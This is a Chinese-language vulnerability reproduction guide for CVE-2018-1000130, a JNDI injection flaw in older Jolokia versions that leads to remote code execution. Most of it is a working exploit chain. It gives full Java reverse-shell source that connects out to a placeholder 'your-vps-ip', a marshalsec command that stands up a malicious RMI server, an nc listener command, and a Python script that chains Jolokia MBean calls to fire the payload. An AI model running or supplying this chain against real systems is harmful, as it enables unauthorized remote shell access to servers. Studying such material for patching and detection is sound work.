---
title: "（CVE-2018-1000130）Jolokia 远程代码执行漏洞"
id: zhfly2993
---

# （CVE-2018-1000130）Jolokia 远程代码执行漏洞

## 一、漏洞简介

Jolokia服务的代理模式默认情况下在1.5.0版之前容易受到**JNDI注入**的攻击。当以代理模式部署Jolokia代理时，有权访问Jolokia Web端点的外部攻击者可以通过JNDI注入攻击远程执行任意代码。由于Jolokia库使用用户提供的输入启动LDAP / RMI连接，因此有可能造成这种攻击。

#### 利用条件：

*   目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口
*   目标使用了 `jolokia-core` 依赖（版本要求暂未知）并且环境中存在相关 MBean
*   目标可以请求攻击者的服务器（请求可出外网）
*   实际测试 RMI 注入受目标 JDK 版本影响，jdk < 6u141/7u131/8u121

## 二、漏洞影响

Jolokia < 1.50

## 三、复现过程

#### 漏洞分析

1.  利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm
2.  设置 connectionURL 地址为 RMI Service URL
3.  设置 contextFactory 为 RegistryContextFactory
4.  停止 Realm
5.  启动 Realm 以触发指定 RMI 地址的 JNDI 注入，造成 RCE 漏洞

### 漏洞复现

##### 步骤一：查看已存在的 MBeans

访问 `/jolokia/list` 接口，查看是否存在 `type=MBeanFactory` 和 `createJNDIRealm` 关键词。

##### 步骤二：准备要执行的 Java 代码

需要修改脚本里对应的反弹shell的ip和端口

```
/**
 *  javac -source 1.5 -target 1.5 JNDIObject.java
 *
 *  Build By LandGrey
 * */

import java.io.File;

import java.io.InputStream;

import java.io.OutputStream;

import java.net.Socket; `public class JNDIObject {

static {

try{

String ip = “your-vps-ip”;

String port = “443”;

String py_path = null;

String[] cmd;

if (!System.getProperty(“os.name”).toLowerCase().contains(“windows”)) {

String[] py_envs = new String[]{"/bin/python", “/bin/python3”, “/usr/bin/python”, “/usr/bin/python3”, “/usr/local/bin/python”, “/usr/local/bin/python3”};

for(int i = 0; i < py_envs.length; ++i) {

String py = py_envs[i];

if ((new File(py)).exists()) {

py_path = py;

break;

}

}

if (py_path != null) {

if ((new File("/bin/bash")).exists()) {

cmd = new String[]{py_path, “-c”, “import pty;pty.spawn(”/bin/bash")"};

} else {

cmd = new String[]{py_path, “-c”, “import pty;pty.spawn(”/bin/sh")"};

}

} else {

if ((new File("/bin/bash")).exists()) {

cmd = new String[]{"/bin/bash"};

} else {

cmd = new String[]{"/bin/sh"};

}

}

} else {

cmd = new String[]{“cmd.exe”};

}

Process p = (new ProcessBuilder(cmd)).redirectErrorStream(true).start();

Socket s = new Socket(ip, Integer.parseInt(port));

InputStream pi = p.getInputStream();

InputStream pe = p.getErrorStream();

InputStream si = s.getInputStream();

OutputStream po = p.getOutputStream();

OutputStream so = s.getOutputStream();

while(!s.isClosed()) {

while(pi.available() > 0) {

so.write(pi.read());

}

while(pe.available() > 0) {

so.write(pe.read());

}

while(si.available() > 0) {

po.write(si.read());

}

so.flush();

po.flush();

Thread.sleep(50L);

try {

p.exitValue();

break;

} catch (Exception e) {

}

}

p.destroy();

s.close();

}catch (Throwable e){

e.printStackTrace();

}

}

}` 
```

##### 步骤三：架设恶意 rmi 服务

```
https://github.com/ianxtianxt/marshalsec 
```

使用下面命令架设对应的 rmi 服务：

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389 
```

##### 步骤四：监听反弹 shell 的端口

一般使用 nc 监听端口，等待反弹 shell

```
nc -lvp 上面java脚本里面自己设置的端口 
```

##### 步骤五：发送恶意 payload

根据实际情况修改 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。

```
#!/usr/bin/env python3
# coding: utf-8
# Referer: https://ricterz.me/posts/2019-03-06-yet-another-way-to-exploit-spring-boot-actuators-via-jolokia.txt

import requests

url = ‘[http://127.0.0.1:8080/jolokia](http://127.0.0.1:8080/jolokia)’

create_realm = {

“mbean”: “Tomcat:type=MBeanFactory”,

“type”: “EXEC”,

“operation”: “createJNDIRealm”,

“arguments”: [“Tomcat:type=Engine”]

}

wirte_factory = {

“mbean”: “Tomcat:realmPath=/realm0,type=Realm”,

“type”: “WRITE”,

“attribute”: “contextFactory”,

“value”: “com.sun.jndi.rmi.registry.RegistryContextFactory”

}

write_url = {

“mbean”: “Tomcat:realmPath=/realm0,type=Realm”,

“type”: “WRITE”,

“attribute”: “connectionURL”,

“value”: “rmi://your-vps-ip:1389/JNDIObject”

}

stop = {

“mbean”: “Tomcat:realmPath=/realm0,type=Realm”,

“type”: “EXEC”,

“operation”: “stop”,

“arguments”: []

}

start = {

“mbean”: “Tomcat:realmPath=/realm0,type=Realm”,

“type”: “EXEC”,

“operation”: “start”,

“arguments”: []

}

flow = [create_realm, wirte_factory, write_url, stop, start] `for i in flow:

print(’%s MBean %s: %s …’ % (i[‘type’].title(), i[‘mbean’], i.get(‘operation’, i.get(‘attribute’))))

r = requests.post(url, json=i)

r.json()

print(r.status_code)` 
```